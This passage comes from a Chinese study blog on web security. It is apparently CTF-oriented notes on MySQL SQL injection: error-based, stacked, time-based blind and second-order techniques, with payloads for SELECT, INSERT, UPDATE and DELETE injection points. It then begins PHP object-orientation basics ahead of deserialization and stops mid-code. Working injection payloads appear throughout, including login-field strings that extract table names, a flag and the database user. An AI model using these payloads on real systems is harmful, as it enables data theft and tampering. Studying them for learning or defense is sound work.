<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>没有回显的情况下,获取数据时,使用布尔盲注需要发送多次请求,效率比较低,我们可以尝试根据报错信息带出数据</p>
<p>只要我们把需要的数据写入报错信息中,页面中显示报错信息的时候,就会把我们所需要的数据带出来</p>
<p>所以,报错信息,一定程度上也可以看作是一种通道</p>
<p>首先修改一下我们的<code>login.php</code>,增加如下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;errno&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$conn</span>-&gt;error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="updatexml报错"><a href="#updatexml报错" class="headerlink" title="updatexml报错"></a>updatexml报错</h5><p>函数updatexml(XML_document,XPath_string,new_value)包含三个函数</p>
<p>第一个参数是string格式,为XML文档对象名称,例如doc</p>
<p>第二个参数是路径</p>
<p>第三个参数是替换查找符合条件的数据</p>
<p>原理:输入错误的第二个参数,更改路径的符号,使其报错带出我们想要的数据</p>
<p>payload:<code>username=123&#39; or updatexml(1, concat(&#39;[&#39;,(select user()),&#39;]&#39;),3)%23&amp;password=123</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210182127615.png" alt="image-20221018212700518"></p>
<p>那么问题来了,这个<code>[]</code>or<code>&#123;&#125;</code>甚至是<code>~</code>的作用是什么,根据updatexml函数可以看出,第二条数据是xpath,Xpath是一门从html中提取数据的语言,这里我们们如果不加符号,会发现无法返回想要的数据,而这些符号的作用就是选中这些区块,使他们成为一个整体,然后从HTML中显示出来</p>
<p>同理,我们可以拿到表名 payload:<code>username=123&#39; or updatexml(1, concat(&#39;[&#39;,(select group_concat(table_name)from information_schema.tables where table_schema=database()),&#39;]&#39;),3)%23&amp;password=123</code></p>
<p>如果flag过长无法显示时，我们可以使用这种方法<code>1 union select 1,updatexml(1,concat(&#39;[&#39;,right((select flag from sqli.flag),31),&#39;]&#39;),1)</code></p>
<p>意思是从右边读取31位,两部分拼接起来就可以了<br><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210182143697.png" alt="image-20221018214325643"></p>
<h5 id="floor-报错"><a href="#floor-报错" class="headerlink" title="floor 报错"></a>floor 报错</h5><p><code>select count(*) from users group by concat(database(),floor(rand(0)*2));</code></p>
<p><code>select count(*),concat(database(),floor(rand(0)*2)) as x from users group by x;</code></p>
<h5 id="整数溢出报错"><a href="#整数溢出报错" class="headerlink" title="整数溢出报错"></a>整数溢出报错</h5><h6 id="exp报错"><a href="#exp报错" class="headerlink" title="exp报错"></a>exp报错</h6><blockquote>
<p>基于一个数学函数,取e的x次方,当我们输入的值大于709就报错,适用版本:5.5.5<del>5.5.49,取反运算符</del>的值总会大于709</p>
</blockquote>
<p>注意:这里必须使用嵌套,因为不适用嵌套不加<code>select * from</code>无法大于整数溢出</p>
<p>payload:<code>username=123&#39; and exp(~(select*from(select group_concat(table_name)from information_schema.tables where table_schema=database())a))%23&amp;password=123</code></p>
<h6 id="pow报错"><a href="#pow报错" class="headerlink" title="pow报错"></a>pow报错</h6><p>pow函数简介:</p>
<blockquote>
<ol>
<li>功能: 计算x的y次幂.</li>
<li>返回值: x不能为负数且y为小数, 或者x为0且y小于等于0,返回幂指数的结果</li>
<li>返回类型: double型, int,float会给予警告</li>
</ol>
</blockquote>
<p>pow(x,y)表示计算x的y次方,当计算值过大时,会发生double溢出,数据库报错</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210182210735.png" alt="image-20221018221022700"></p>
<h6 id="cot报错"><a href="#cot报错" class="headerlink" title="cot报错"></a>cot报错</h6><p>cot函数简介:</p>
<blockquote>
<p>cot函数是三角函数,cot坐标系表示: cotθ=x/y,在三角函数中cotθ=cosθ/sinθ</p>
</blockquote>
<p>x取值无限接近于0和Π的整数倍,取0或Π的整数倍报错</p>
<p>payload:<code>select * from user where username=&#39;1&#39; and 1=1 and cot(0);</code></p>
<h5 id="不存在函数报错"><a href="#不存在函数报错" class="headerlink" title="不存在函数报错"></a>不存在函数报错</h5><p>如图</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210182216342.png" alt="image-20221018221644309"></p>
<p>我们就能拿到数据库的名字</p>
<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>如果目标开启了多语句执行的时候,可以采用多语句执行的方式修改数据库的任意结构和数据,这种特殊的注入就是堆叠注入</p>
<p>堆叠注入一般用分号<code>;</code>来分割多条语句,堆叠注入的情况下,还可以进行变量定义、定义存储过程、实现复杂语句等高级功能</p>
<p>最简单的堆叠注入如下:</p>
<p><code>select * from user;select * from page;</code></p>
<p>这里和联合注入的最大区别就是</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210182222260.png" alt="image-20221018222217218"></p>
<p>而且堆叠注入的两条语句可以查询不同的列数,但是联合查询的列数必须是相同的</p>
<h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>基于时间的盲注,总体思路和布尔盲注有些类似,通过<code>sleep</code>等函数的使用,在满足猜测条件时,人工进行延时,通过延时这种信号来反映出我们猜测的结果</p>
<p>所以,在一定程度上页面发响应的时间也可以作为一种信道来使用</p>
<h5 id="基于时间延时的盲注-SLEEP"><a href="#基于时间延时的盲注-SLEEP" class="headerlink" title="基于时间延时的盲注: SLEEP"></a>基于时间延时的盲注: SLEEP</h5><p>函数sleep,使用说明:</p>
<blockquote>
<p>睡眠(暂停)时间为duration参数给定的秒数,然后返回0,若sleep()被中断,它会返回1</p>
</blockquote>
<p><code>select * from table where id=1 and sleep();</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210182237678.png" alt="image-20221018223719639"></p>
<p>因为这里用and连接,虽然成功执行了sleep(1),但是执行sleep函数返回的是0,所以查询语句无法正确执行</p>
<p>or在匹配时会匹配所有的数据,由于这里我们不止有id=1的数据,所以会在4.04秒后才执行完毕</p>
<h5 id="配合if条件触发延时"><a href="#配合if条件触发延时" class="headerlink" title="配合if条件触发延时"></a>配合if条件触发延时</h5><p>IF(expr1,expr2,expr3)</p>
<p>如果expr1是true(expr1&lt;&gt;0 and expr1&lt;&gt;NULL)，则IF()的返回值为expr2; 否则返回值则为expr3. IF() 的返回值为数字值或字符串值, 具体情况视其所在语句而定.</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210192046241.png" alt="image-20221019204619155"></p>
<p>意思是查询,然后如果2&gt;1就sleep1秒,否则就替换为1</p>
<p>或者可以这么说,如果2&gt;1就返回1,否则就替换为0</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210192057577.png" alt="image-20221019205757544"></p>
<p>同理可得,配合布尔盲注</p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210192054387.png" alt="image-20221019205451347"></p>
<h5 id="截取函数"><a href="#截取函数" class="headerlink" title="截取函数"></a>截取函数</h5><p><code>substring()</code>和<code>substr()</code></p>
<p>SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)</p>
<p>substr(string,start,lenth)                                                                                                                                                                                                   参数同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度</p>
<p><code>substring_index()</code>                                                                                                                                                                                        substring_index(str,delmi,count)                                                                                                                                                                    说明：substring_index(被截取的字段，关键字，关键字出现的次数)</p>
<h5 id="配合select-case-when条件触发"><a href="#配合select-case-when条件触发" class="headerlink" title="配合select case when条件触发"></a>配合select case when条件触发</h5><p>SQL CASE表达式是一种通用的条件表达式，类似于其他语言中的if/else语句</p>
<p>例如：</p>
<p><code>select case when username=&quot;admin THEN&#39;admin &#39; ELSE &#39;xxx&#39; end from user&quot;;</code></p>
<p><code>select case when username=&quot;admin&quot; THEN &#39;aaa&#39; ELSE (sleep(3)) end from user;</code></p>
<h5 id="基于时间延时的盲注：逐字注入"><a href="#基于时间延时的盲注：逐字注入" class="headerlink" title="基于时间延时的盲注：逐字注入"></a>基于时间延时的盲注：逐字注入</h5><p>能够截取字符串，同时能触发延时即可</p>
<p><code>select * from table where id =1 and (if(substr(database(),1,1)=&#39;u&#39;,sleep(3),null));</code></p>
<p><code>select * from table where id =1 and (if(ascii(substr(database(),1,1))=100,sleep(3),null));</code></p>
<h5 id="基于时间延时的盲注：benchmark"><a href="#基于时间延时的盲注：benchmark" class="headerlink" title="基于时间延时的盲注：benchmark"></a>基于时间延时的盲注：benchmark</h5><p>除了sleep之外的时间延时注入，还有BENCHMARK(count,expr)</p>
<p>BENCHMARK()函数重复count次执行表达式expr。它可以被用于计算MySQL处理表达式的速度。结果通常为0</p>
<p><code>select benchmark(10000000,sha(1));</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210192133680.png" alt="image-20221019213336643"></p>
<h5 id="基于时间延时的盲注：笛卡尔积"><a href="#基于时间延时的盲注：笛卡尔积" class="headerlink" title="基于时间延时的盲注：笛卡尔积"></a>基于时间延时的盲注：笛卡尔积</h5><p>除了sleep之外的时间延时注入，还有笛卡尔积</p>
<blockquote>
<p>笛卡尔乘积是指在数学中，两个<a href="https://baike.baidu.com/item/%E9%9B%86%E5%90%88?fromModule=lemma_inlink">集合</a><em>X</em>和<em>Y</em>的笛卡尔积（Cartesian product），又称<a href="https://baike.baidu.com/item/%E7%9B%B4%E7%A7%AF?fromModule=lemma_inlink">直积</a>，表示为<em>X</em>×<em>Y</em>，第一个对象是<em>X</em>的成员而第二个对象是<em>Y</em>的所有可能<a href="https://baike.baidu.com/item/%E6%9C%89%E5%BA%8F%E5%AF%B9?fromModule=lemma_inlink">有序对</a>的其中一个成员 [3] 。</p>
<p>假设集合A={a, b}，集合B={0, 1, 2}，则两个集合的笛卡尔积为{(a, 0), (a, 1), (a, 2), (b, 0), (b, 1), (b, 2)}。</p>
<p>类似的例子有，如果A表示某学校学生的集合，B表示该学校所有课程的集合，则A与B的笛卡尔积表示所有可能的选课情况。A表示所有声母的集合，B表示所有韵母的集合，那么A和B的笛卡尔积就为所有可能的汉字全拼。</p>
<p>设A,B为集合，用A中元素为第一元素，B中元素为第二元素构成有序对，所有这样的有序对组成的集合叫做A与B的笛卡尔积，记作AxB.</p>
<p>笛卡尔积的符号化为：</p>
<p>A×B={(x,y)|x∈A∧y∈B}</p>
<p>例如，A={a,b}, B={0,1,2}，则</p>
<p>A×B={(a, 0), (a, 1), (a, 2), (b, 0), (b, 1), (b, 2)}</p>
<p>B×A={(0, a), (0, b), (1, a), (1, b), (2, a), (2, b)}</p>
</blockquote>
<p><code>slect count(*) from user A,user B;</code></p>
<h5 id="基于时间延时的盲注：get-lock"><a href="#基于时间延时的盲注：get-lock" class="headerlink" title="基于时间延时的盲注：get_lock()"></a>基于时间延时的盲注：get_lock()</h5><p>除了sleep之外的时间延时注入，还有：GET_LOCK(str,timeout)</p>
<p>说明：设法使用字符串str给定的名字得到一个锁，超时为timeout秒</p>
<p><code>select get_lock(&#39;a&#39;,10);</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210192141683.png" alt="image-20221019214126644"></p>
<p>tip: 设置锁后需要重新开一个窗口并且是长连接才会有效</p>
<h5 id="基于时间延时的盲注：RLIKE"><a href="#基于时间延时的盲注：RLIKE" class="headerlink" title="基于时间延时的盲注：RLIKE"></a>基于时间延时的盲注：RLIKE</h5><p>除了sleep之外的时间延时注入，还有：RLIKE</p>
<p>通过rpad或repeat构造长字符串，加以计算量大的pattern，通过repeats的参数可以控制延时长短</p>
<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>针对无法直接注入的情况，通过把sql语句注入到数据库中，当程序从数据库中拿出数据的时候，默认是安全的，这时候进行拼接的时候，就会出现二次注入的情况</p>
<h3 id="0x7-不同的注入点的对应技巧"><a href="#0x7-不同的注入点的对应技巧" class="headerlink" title="0x7 不同的注入点的对应技巧"></a>0x7 不同的注入点的对应技巧</h3><p>注入点拼接在sql语句的不同位置，sql注入的利用方式也不尽相同，这里我们研究不同位置下的sql注入</p>
<h4 id="select注入"><a href="#select注入" class="headerlink" title="select注入"></a>select注入</h4><p>附官方文档:<a href="https://docs.oracle.com/cd/E17952_01/mysql-5.6-en/select.html">https://docs.oracle.com/cd/E17952_01/mysql-5.6-en/select.html</a></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">    [<span class="keyword">ALL</span> <span class="operator">|</span> <span class="keyword">DISTINCT</span> <span class="operator">|</span> DISTINCTROW ]</span><br><span class="line">    [HIGH_PRIORITY]</span><br><span class="line">    [STRAIGHT_JOIN]</span><br><span class="line">    [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]</span><br><span class="line">    [SQL_CACHE <span class="operator">|</span> SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]</span><br><span class="line">    select_expr [, select_expr] ...</span><br><span class="line">    [into_option]</span><br><span class="line">    [<span class="keyword">FROM</span> table_references</span><br><span class="line">      [<span class="keyword">PARTITION</span> partition_list]]</span><br><span class="line">    [<span class="keyword">WHERE</span> where_condition]</span><br><span class="line">    [<span class="keyword">GROUP</span> <span class="keyword">BY</span> &#123;col_name <span class="operator">|</span> expr <span class="operator">|</span> position&#125;</span><br><span class="line">      [<span class="keyword">ASC</span> <span class="operator">|</span> <span class="keyword">DESC</span>], ... [<span class="keyword">WITH</span> <span class="keyword">ROLLUP</span>]]</span><br><span class="line">    [<span class="keyword">HAVING</span> where_condition]</span><br><span class="line">    [<span class="keyword">ORDER</span> <span class="keyword">BY</span> &#123;col_name <span class="operator">|</span> expr <span class="operator">|</span> position&#125;</span><br><span class="line">      [<span class="keyword">ASC</span> <span class="operator">|</span> <span class="keyword">DESC</span>], ...]</span><br><span class="line">    [LIMIT &#123;[<span class="keyword">offset</span>,] row_count <span class="operator">|</span> row_count <span class="keyword">OFFSET</span> <span class="keyword">offset</span>&#125;]</span><br><span class="line">    [<span class="keyword">PROCEDURE</span> procedure_name(argument_list)]</span><br><span class="line">    [into_option]</span><br><span class="line">    [<span class="keyword">FOR</span> <span class="keyword">UPDATE</span> <span class="operator">|</span> LOCK <span class="keyword">IN</span> SHARE MODE]</span><br><span class="line"></span><br><span class="line">into_option: &#123;</span><br><span class="line">    <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;file_name&#x27;</span></span><br><span class="line">        [<span class="type">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">        export_options</span><br><span class="line">  <span class="operator">|</span> <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;file_name&#x27;</span></span><br><span class="line">  <span class="operator">|</span> <span class="keyword">INTO</span> var_name [, var_name] ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="注入点在select之后，from之前"><a href="#注入点在select之后，from之前" class="headerlink" title="注入点在select之后，from之前"></a>注入点在select之后，from之前</h5><p>可以通过<code>as</code>别名将数据直接覆盖带出,比如正常查询是这样的</p>
<p><code>select username from user;</code></p>
<p>我们就可以这样利用<code>select (select password) as username from user;</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210192208285.png" alt="image-20221019220833245"></p>
<h5 id="注入点在引用表"><a href="#注入点在引用表" class="headerlink" title="注入点在引用表"></a>注入点在引用表</h5><p>这里分两种情况,如果表名被反引号包裹,需要现闭合反引号,这时候我们可以子查询</p>
<p>正常情况为:<code>select title, content from page</code></p>
<p>加入子查询后:<code>select title,content from (select user() as title,&#39;aaa&#39; as content) as b;</code></p>
<p>这样就可以通过title列把user()数据带出</p>
<h5 id="注入点在where条件以后"><a href="#注入点在where条件以后" class="headerlink" title="注入点在where条件以后"></a>注入点在where条件以后</h5><p>这里我们可以使用union联合查询</p>
<h5 id="注入点在group-by或者order-by之后"><a href="#注入点在group-by或者order-by之后" class="headerlink" title="注入点在group by或者order by之后"></a>注入点在group by或者order by之后</h5><p>正常情况下为:<code>select id,title,content from page order by 注入点;</code></p>
<p>这里可以配合时间盲注<code>select id,title,content from page order by id ,if(substr((select username from user where id =1),1,1)=&#39;a&#39; ,sleep(1),1);</code></p>
<h5 id="注入点在limit之后"><a href="#注入点在limit之后" class="headerlink" title="注入点在limit之后"></a>注入点在limit之后</h5><p><code>select id,title,content from page order by id limit 注入点;</code></p>
<p>由于limit之后,只能是数字,可以使用<code>procedure analyse</code>语法来实现报错注入,但是这种方式只能是MySQL5.6以前使用</p>
<p><code>select title,content from page limit 1 procedure analyse(updatexml(1,concat(0x3a,version(),0x3a),1));</code></p>
<h4 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h4><p>附官方文档：<a href="https://docs.oracle.com/cd/E17952_01/mysql-5.6-en/insert.html">https://docs.oracle.com/cd/E17952_01/mysql-5.6-en/insert.html</a></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> [LOW_PRIORITY <span class="operator">|</span> DELAYED <span class="operator">|</span> HIGH_PRIORITY] [IGNORE]</span><br><span class="line">    [<span class="keyword">INTO</span>] tbl_name</span><br><span class="line">    [<span class="keyword">PARTITION</span> (partition_name [, partition_name] ...)]</span><br><span class="line">    [(col_name [, col_name] ...)]</span><br><span class="line">    &#123;<span class="keyword">VALUES</span> <span class="operator">|</span> <span class="keyword">VALUE</span>&#125; (value_list) [, (value_list)] ...</span><br><span class="line">    [<span class="keyword">ON</span> DUPLICATE KEY <span class="keyword">UPDATE</span> assignment_list]</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> [LOW_PRIORITY <span class="operator">|</span> DELAYED <span class="operator">|</span> HIGH_PRIORITY] [IGNORE]</span><br><span class="line">    [<span class="keyword">INTO</span>] tbl_name</span><br><span class="line">    [<span class="keyword">PARTITION</span> (partition_name [, partition_name] ...)]</span><br><span class="line">    <span class="keyword">SET</span> assignment_list</span><br><span class="line">    [<span class="keyword">ON</span> DUPLICATE KEY <span class="keyword">UPDATE</span> assignment_list]</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> [LOW_PRIORITY <span class="operator">|</span> HIGH_PRIORITY] [IGNORE]</span><br><span class="line">    [<span class="keyword">INTO</span>] tbl_name</span><br><span class="line">    [<span class="keyword">PARTITION</span> (partition_name [, partition_name] ...)]</span><br><span class="line">    [(col_name [, col_name] ...)]</span><br><span class="line">    <span class="keyword">SELECT</span> ...</span><br><span class="line">    [<span class="keyword">ON</span> DUPLICATE KEY <span class="keyword">UPDATE</span> assignment_list]</span><br><span class="line"></span><br><span class="line"><span class="keyword">value</span>:</span><br><span class="line">    &#123;expr <span class="operator">|</span> <span class="keyword">DEFAULT</span>&#125;</span><br><span class="line"></span><br><span class="line">value_list:</span><br><span class="line">    <span class="keyword">value</span> [, <span class="keyword">value</span>] ...</span><br><span class="line"></span><br><span class="line">assignment:</span><br><span class="line">    col_name <span class="operator">=</span> <span class="keyword">value</span></span><br><span class="line"></span><br><span class="line">assignment_list:</span><br><span class="line">    assignment [, assignment] ...</span><br></pre></td></tr></table></figure>

<h5 id="注入点在要插入的表名"><a href="#注入点在要插入的表名" class="headerlink" title="注入点在要插入的表名"></a>注入点在要插入的表名</h5><p>通过劫持要插入的表，可以增加文章，这时候也可以增加一个用户表数据进去</p>
<p>正常情况下这样：<code>insert into page (title,content) values(&quot;page1&quot;,&quot;content1&quot;);</code></p>
<p>当我们可以控制表名的时候,就可以劫持插入<code>insert into user(username,password) values(&quot;111&quot;,&quot;111&quot;);#(title,content) values(&quot;page1&quot;,&quot;content1&quot;);</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210201801227.png" alt="image-20221020180130184"></p>
<h5 id="注入点在插入的值"><a href="#注入点在插入的值" class="headerlink" title="注入点在插入的值"></a>注入点在插入的值</h5><p><code> insert into page(title,content) values(&quot;注入点&quot;,&quot;xxx&quot;);</code></p>
<p><code>insert into page(title,content) values(&quot;123&quot;,&quot;123&quot;),(&quot;456&quot;,(select user()));#&quot;,&quot;xxx&quot;);</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210202159124.png" alt="image-20221020215901080"></p>
<h4 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h4><h5 id="注入点在set后边"><a href="#注入点在set后边" class="headerlink" title="注入点在set后边"></a>注入点在set后边</h5><p>和上面insert利用方法相似，可以通过修改多条数据实现数据回显</p>
<p><code>update page set title = &quot;注入点&quot; where id = 1;</code></p>
<p>我们可以通过这种方式注入</p>
<p><code>update page set title = &quot;123&quot;,content = (select user()) where id = 5 ;#&quot; where id = 1;</code></p>
<p>注入后,我们可以实现</p>
<p><code>update page set title = &quot;123&quot;, content = (select user()) where id = 5;</code></p>
<p><img src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202210202238966.png" alt="image-20221020223813925"></p>
<h5 id="注入点在values后面"><a href="#注入点在values后面" class="headerlink" title="注入点在values后面"></a>注入点在values后面</h5><p>如果注入点在value中,我们同样可以闭合括号,实现多个记录的修改,类似于insert方法</p>
<h4 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h4><h5 id="注入点在where之后"><a href="#注入点在where之后" class="headerlink" title="注入点在where之后"></a>注入点在where之后</h5><p>这里如果不小心就会删除表内所有的数据,所以需要一个特别的技巧</p>
<p>由于<code>select sleep(1);</code>恒返回0,所以在delete注入时,要确保不会影响表数据,造成下次没办法利用,所以我可以在注入点后</p>
<p><code>delete from page where id = 1 and sleep(1);</code></p>
<p>确保不会真的删除表数据</p>
<p><code> delete from page where id = 1  1 or updatexml(1, concat(0x7e, database()), 0) and sleep(1);</code></p>
<h5 id="注入点在表名中"><a href="#注入点在表名中" class="headerlink" title="注入点在表名中"></a>注入点在表名中</h5><p>可以使用报错注入回显数据,避免数据被删除</p>
]]></content>
      <tags>
        <tag>Web</tag>
        <tag>Study</tag>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Web_6_反序列化</title>
    <url>/2022/10/20/web_6/</url>
    <content><![CDATA[<h2 id="第一节-php基础、类与对象"><a href="#第一节-php基础、类与对象" class="headerlink" title="第一节 php基础、类与对象"></a>第一节 php基础、类与对象</h2><p>读文档类与对象</p>
<h3 id="0x1-php中的面向对象"><a href="#0x1-php中的面向对象" class="headerlink" title="0x1 php中的面向对象"></a>0x1 php中的面向对象</h3><p>在前面的课程中，我们使用的最小命令单元，是函数或者语言结构，我们可以通过某个函数（比如phpinfo）来执行某个操作，这种使用单独函数来完成特定功能的语言模式，我们叫做面向过程编程。面向过程编程方法的优势是代码简单，开发迅速，不足之处就是如果功能、逻辑、数据进行大量的增长，这时候，代码维护难度将会成倍的增加，扩展性、可移植性就大大降低。</p>
<p>于是以Java为代表的面向对象编程顺势而出，解决了复杂逻辑空间下的编码模式问题，php在最开始的纯面向过程逐步向面向对象模式改进，在保持其一贯的简单易学、编码快速的优势下，同向对象之间取得平衡。</p>
<h4 id="面向对象的思想"><a href="#面向对象的思想" class="headerlink" title="面向对象的思想"></a>面向对象的思想</h4><p>面向对象的设计思想主要有</p>
<ol>
<li>系统中一切事物皆为对象</li>
<li>对象是属性及其操作的封装体</li>
<li>对象可按其性质划分为类，对象成为类的实例</li>
<li>实例关系和继承关系是对象之间的静态关系</li>
<li>消息传递是对象之间动态联系的唯一形式，也是计算的唯一形式</li>
<li>方法是消息的序列</li>
</ol>
<h4 id="php面向对象的特点"><a href="#php面向对象的特点" class="headerlink" title="php面向对象的特点"></a>php面向对象的特点</h4><p>面向对象三大特征：<code>封装、继承、多态</code></p>
<h5 id="聚类"><a href="#聚类" class="headerlink" title="聚类"></a>聚类</h5><p>在面向对象的思路上，功能相似的函数集合在一起</p>
<p>将完成一个共同功能的函数集中起来就是聚类</p>
<h5 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h5><p>功能封装，数据封装，供内部各个方法使用</p>
<h5 id="隔离"><a href="#隔离" class="headerlink" title="隔离"></a>隔离</h5><p>调用对象从一个蓝图转换到一个可以使用的产品的过程叫做实例化</p>
<p>俩个实例之间的属性不能互相访问，在对象内部，也不能直接访问外部的变量。</p>
<h5 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h5><p>继承可以理解为对象的包含，在php中可以使用<code>extends</code>关键字继承类</p>
<h5 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h5><p>在php中是弱类型,在参数传递过程中,可以改变参数的对象类型,作为对象依然是可以传递进去,当同一个参数由不同对象实例传递,那么调用结果就实现不同的状态</p>
<p>例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Command</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$var</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们有一个command类，她有一个run方法，会执行参数run方法，然后我们有两个其他对象</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Command</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">  <span class="variable">$var</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rabbit</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">run</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;兔子跑了&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Script</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;脚本已启动&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span> = <span class="keyword">new</span> <span class="title class_">Command</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span> = <span class="keyword">new</span> <span class="title class_">Rabbit</span>();</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Script</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>-&gt;<span class="title function_ invoke__">run</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="variable">$command</span>-&gt;<span class="title function_ invoke__">run</span>(<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure>

<h3 id="0x2-类与对象"><a href="#0x2-类与对象" class="headerlink" title="0x2 类与对象"></a>0x2 类与对象</h3><h4 id="类的属性和方法权限"><a href="#类的属性和方法权限" class="headerlink" title="类的属性和方法权限"></a>类的属性和方法权限</h4><p>在php中，类的属性和方法权限有三个权限，分别为</p>
<ul>
<li>public</li>
<li>protected</li>
<li>private</li>
</ul>
<h5 id="public权限"><a href="#public权限" class="headerlink" title="public权限"></a>public权限</h5><p>被定义为公有类成员可以在任何地方被访问</p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Command</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span> = <span class="keyword">new</span> <span class="title class_">Command</span>();</span><br><span class="line"><span class="variable">$command</span>-&gt;cmd=<span class="string">&quot;whoami&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>这里用箭头来指向类的属性，箭头之后，不需要$符号</p>
<p>也可以使用<code>var</code>来定义类属性,如果使用<code>var</code>定义则默认<code>public</code>权限</p>
<h5 id="protected权限"><a href="#protected权限" class="headerlink" title="protected权限"></a>protected权限</h5><p>被定义为受保护的类成员则可以被其自身以及其子类和父类访问</p>
<p>🌰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$color</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eat</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Human</span> <span class="keyword">extends</span> <span class="title">Animals</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$gender</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getColor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;color</span><br><span class="line">  